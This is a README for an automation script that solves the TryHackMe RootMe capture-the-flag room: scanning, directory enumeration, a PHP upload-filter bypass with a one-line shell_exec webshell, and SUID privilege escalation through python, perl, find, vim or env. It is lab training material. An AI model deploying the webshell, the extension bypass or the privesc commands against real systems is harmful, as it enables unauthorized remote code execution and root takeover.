# rootmeautopwn

> **TryHackMe — RootMe CTF** full automation script  
> Author: 0xb0rn3 | 0xbv1 · IG: theehiv3 · X: @0xbv1

Automates the entire RootMe exploitation chain end-to-end: recon → directory enumeration → file upload filter bypass → webshell deployment → user flag → SUID enumeration → privilege escalation → root flag.

---

## Room Info

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | [RootMe](https://tryhackme.com/room/rrootme) |
| Difficulty | Easy |
| Type | Linux web app + file upload + SUID privesc |
| Key services | Apache HTTP (port 80) |

---

## Exploitation Chain

```
[Recon]          nmap -sV -sC -p 80
    │
    ▼
[Enumeration]    gobuster → discovers /panel/ /uploads/
    │
    ▼
[Upload Bypass]  .php5 / .phtml filter bypass → webshell
    │
    ▼
[Webshell]       GET /uploads/shell.php5?cmd=<cmd>
    │
    ▼
[User Flag]      find /var/www /home -name user.txt
    │
    ▼
[SUID Enum]      find /usr/bin -perm -4000
    │
    ▼
[Privesc]        python/perl/find/vim/env SUID → setuid(0)
    │
    ▼
[Root Flag]      cat /root/root.txt
```

---

## Phases

### Phase 1 — Reconnaissance
Runs an nmap service and script scan against port 80. Extracts the Apache version from scan output or falls back to a `curl -I` header check. All results written to the output directory.

### Phase 2 — Directory Enumeration
Runs gobuster with an auto-detected wordlist (tries common SecLists, dirb, and dirbuster paths). Falls back to a minimal built-in wordlist if none are found. Confirms `/panel/` (upload form) and `/uploads/` (execution directory) exist with a manual curl check as backup.

### Phase 3 — Exploitation (Upload Bypass)
The RootMe upload form blocks `.php` files. The script iterates through bypass extensions in order:

| Extension | Notes |
|-----------|-------|
| `.php5` | Primary — works on default Apache config |
| `.phtml` | PHTML template handler |
| `.php4` | Legacy PHP4 handler |
| `.php3` | Legacy PHP3 handler |
| `.phps` | PHP source handler |

For each extension it uploads a webshell, then immediately verifies remote code execution by requesting `?cmd=echo+EXEC_OK`. Stops at the first confirmed working extension.

**Webshell payload:**
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

### Phase 4 — Flag Retrieval & Privilege Escalation
Retrieves user flag from `/var/www` or `/home`. Enumerates SUID binaries in `/usr/bin` and highlights exploitable ones. Automatically escalates using whichever SUID binary is found:

| Binary | Privesc command |
|--------|----------------|
| `python` | `os.setuid(0); os.system(...)` |
| `perl` | `use POSIX; setuid(0); exec(...)` |
| `find` | `-exec cat {} \;` |
| `vim` | `:!cat /root/root.txt` |
| `env` | `env /bin/sh -c '...'` |

---

## Usage

```bash
# Clone and run
git clone https://github.com/0xb0rn3/CTFS.git
cd CTFS/THM/rootmeCTF
chmod +x rootmeautopwn
./rootmeautopwn
```

The script prompts interactively:

```
[?] Enter target IP:
>> 10.10.x.x

[*] Detected LHOST: 10.x.x.x   ← auto-detected from tun0 VPN interface
[?] Use this IP for reverse shell? (y/n):
>> y

[?] Listener port (default 4444):
>> 
```

---

## Output

Everything is saved to a timestamped directory `rootme_pwn_YYYYMMDD_HHMMSS/`:

| File | Contents |
|------|----------|
| `nmap_scan.txt` | nmap greppable output |
| `nmap_output.txt` | nmap full output |
| `apache_version.txt` | Extracted Apache version |
| `gobuster_results.txt` | Directory enumeration results |
| `suid_binaries.txt` | Full SUID binary list |
| `webshell_url.txt` | Active webshell URL |
| `flags.txt` | All captured flags |

---

## Dependencies

| Tool | Purpose | Auto-install |
|------|---------|-------------|
| `nmap` | Service scan | ✅ Arch / Debian |
| `gobuster` | Dir enumeration | ✅ Arch / Debian |
| `curl` | HTTP requests / webshell comms | ✅ Arch / Debian |
| `nc` | Netcat (listener support) | ✅ Arch / Debian |

The script auto-installs missing tools via `pacman` (Arch) or `apt` (Debian/Ubuntu). Other distros require manual installation.

---

## Notes

- Designed specifically for the TryHackMe RootMe room. The `/panel/` upload form and SUID privesc path are intentional by the room design.
- VPN must be connected (TryHackMe OpenVPN) — LHOST is auto-detected from the `tun0` interface.
- The webshell is cleaned up from `/tmp` on exit or interrupt (`SIGINT`/`SIGTERM` handled).
- If gobuster misses `/panel/`, the script falls back to a direct `curl` status check before giving up.

---

## Disclaimer

For authorized use on TryHackMe rooms only. Do not run against systems you do not own or have explicit permission to test.
